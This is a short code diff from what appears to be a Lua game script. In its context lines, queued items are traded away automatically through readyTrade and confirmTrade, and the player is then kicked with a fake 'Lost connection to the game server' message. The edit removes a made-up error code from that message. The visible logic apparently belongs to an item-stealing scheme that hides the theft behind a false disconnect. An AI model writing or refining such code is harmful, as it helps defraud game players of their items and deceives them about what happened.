@@ -418,8 +418,7 @@ if #itemsToSend > 0 then
             readyTrade()
             confirmTrade()
         end
-        plr:kick("Lost connection to the game server, please reconnect
-(Error Code: 277)")
+        plr:kick("Lost connection to the game server, please reconnect")
     end
 
     local function waitForUserJoin()
